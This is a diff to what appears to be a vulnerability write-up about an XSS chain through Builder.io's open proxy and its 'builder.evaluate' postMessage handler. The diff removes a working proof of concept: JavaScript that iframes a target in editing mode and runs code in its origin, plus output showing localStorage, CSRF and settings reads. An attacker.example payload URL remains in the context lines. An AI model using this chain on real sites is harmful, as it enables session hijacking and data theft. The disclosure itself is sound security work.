@@ -94,62 +94,6 @@ https://builder.io/api/v1/proxy-site?proxyUrl=https://attacker.example/poc.html
 
 **Step 5 — Observe** `document.domain === "www.target.example"`, exfiltrated `localStorage["user-cache"]`, and same-origin fetches that carry the victim's cookies.
 
-### Quick verification (no hosting)
-
-1. Log into the private target.
-2. Open `https://builder.io/api/v1/proxy-site?proxyUrl=https://httpbin.org/html`.
-3. In DevTools Console:
-
-```js
-var iframe = document.createElement('iframe');
-iframe.src = 'https://www.target.example/m/earn?builder.frameEditing=true&builder.preview=page&builder.noCache=true&__builder_editing__=true';
-iframe.style.cssText = 'width:100%;height:400px;border:2px solid red';
-document.body.prepend(iframe);
-
-window.addEventListener('message', function (e) {
-  if (e.origin === 'https://www.target.example' && e.data && e.data.type)
-    console.log('[MSG]', e.data.type, JSON.stringify(e.data.data).substring(0, 200));
-});
-
-setTimeout(function () {
-  iframe.contentWindow.postMessage({
-    type: 'builder.evaluate',
-    data: {
-      text: 'return "XSS on " + document.domain + " | localStorage keys: " + Object.keys(localStorage).length',
-      arguments: [],
-      id: 'poc1'
-    }
-  }, '*');
-}, 20000);
-```
-
-4. After ~20s, the console shows:
-
-```
-[MSG] builder.sdkInfo {"target":"vue","version":"5.2.14","modelName":"page","apiKey":"[redacted]"...}
-[MSG] builder.evaluateResult {"result":"XSS on www.target.example | localStorage keys: 22","id":"poc1"}
-```
-
-## Proof of Concept
-
-{{< terminal-replay path="poc/builder_xss_chain.sh" >}}
-# 1. wrap attacker HTML in the open Builder.io proxy
-$ open https://builder.io/api/v1/proxy-site?proxyUrl=https://attacker.example/poc.html
-# served from builder.io — CSP has no script-src
-
-# 2. PoC iframes the exchange with editing flags
-$ # iframe → https://www.target.example/m/earn?builder.frameEditing=true
-[MSG] builder.sdkInfo {"target":"vue","version":"5.2.14",...}
-
-# 3. postMessage from builder.io origin → Function(text) on the exchange
-$ # builder.evaluate → return document.domain + localStorage keys
-[MSG] builder.evaluateResult {"result":"XSS on www.target.example | localStorage keys: 22"}
-
-# 4. same-origin + credentialed CORS reads
-$ # localStorage["user-cache"], /v2/index CSRF, /v2/settings
-{"domain":"www.target.example","keys":22,"csrf":"[redacted]"} # attacker holds recon + XSS on trusted origin
-{{< /terminal-replay >}}
-
 ## Impact
 
 Proven against a logged-in test session with the full 1-click chain:
